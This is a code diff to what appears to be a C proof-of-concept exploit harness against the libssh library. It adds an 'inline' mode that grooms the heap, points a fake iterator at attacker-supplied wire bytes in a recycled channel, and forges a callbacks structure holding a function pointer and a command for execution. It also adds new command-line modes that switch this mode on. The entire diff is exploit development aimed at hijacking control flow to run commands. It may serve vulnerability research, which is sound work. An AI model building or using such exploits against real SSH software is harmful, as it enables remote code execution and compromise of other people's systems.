@@ -41,6 +41,10 @@ static int g_nodetach = 0;
 static int g_no_reclaim = 0;
 static void *g_old_buf = NULL;
 static struct ssh_iterator *g_old_it = NULL;
+#ifdef W13_INLINE
+#define INLINE_CBS_OFF 72
+static int g_inline = 0;
+#endif
 #ifdef W12_FIXEDADDR
 static int g_fixedaddr = 0;
 static uint64_t g_fixed_fn = 0;
@@ -154,6 +158,18 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                 it->next = &g_fake_it;
                 it->data = &g_fake_cbs;
             }
+#ifdef W13_INLINE
+            if (g_inline && it != NULL) {
+                /* The iterate macro reads the iterator's data before on_data
+                 * runs, so the change is seen on its next step. One app-owned
+                 * 16-byte iterator node keeps that step alive; the callbacks
+                 * structure itself is wire bytes in the recycled channel. */
+                g_fake_it.data = (char *)g_groom_ptr + INLINE_CBS_OFF;
+                printf("SERVER inline cbs=%p off=%d\n", g_fake_it.data,
+                       INLINE_CBS_OFF);
+                fflush(stdout);
+            }
+#endif
             if (bf != NULL) {
                 bf->secure = 0;
                 bf->allocated = sizeof(g_fake_buf_data);
@@ -383,6 +399,19 @@ static int run_client(void)
 #endif
             memcpy(payload + 112, &fn, sizeof(fn));
             if (g_exec) {
+#ifdef W13_INLINE
+            if (g_inline) {
+                uint64_t sz = 24;
+                uint64_t ud = (uint64_t)(uintptr_t)&g_exec_cmd;
+                memcpy(payload + INLINE_CBS_OFF, &sz, sizeof(sz));
+                memcpy(payload + INLINE_CBS_OFF + 8, &ud, sizeof(ud));
+                memcpy(payload + INLINE_CBS_OFF + 16, &fn, sizeof(fn));
+                printf("CLIENT inline cbs_off=%d size=%llu userdata=0x%llx fn=0x%llx\n",
+                       INLINE_CBS_OFF, (unsigned long long)sz,
+                       (unsigned long long)ud, (unsigned long long)fn);
+                fflush(stdout);
+            }
+#endif
                 memcpy(payload, g_exec_cmd, sizeof(g_exec_cmd));
 #ifdef W12_FIXEDADDR
                 printf("CLIENT sent exec cmd=%s fn=0x%llx fixedaddr=%d\n",
@@ -507,6 +536,21 @@ int main(int argc, char **argv)
         g_nodetach = 1;
         g_no_reclaim = 1;
         g_exec = 1;
+#ifdef W13_INLINE
+    } else if (argc == 3 && strcmp(argv[2], "groom-inline") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+        g_inline = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-inline-bad") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_exec = 1;
+        g_inline = 1;
+        g_bad_call = 1;
+#endif
 #ifdef W12_FIXEDADDR
     } else if (argc == 4 && strcmp(argv[2], "groom-fixedaddr") == 0) {
         g_groom = 1;
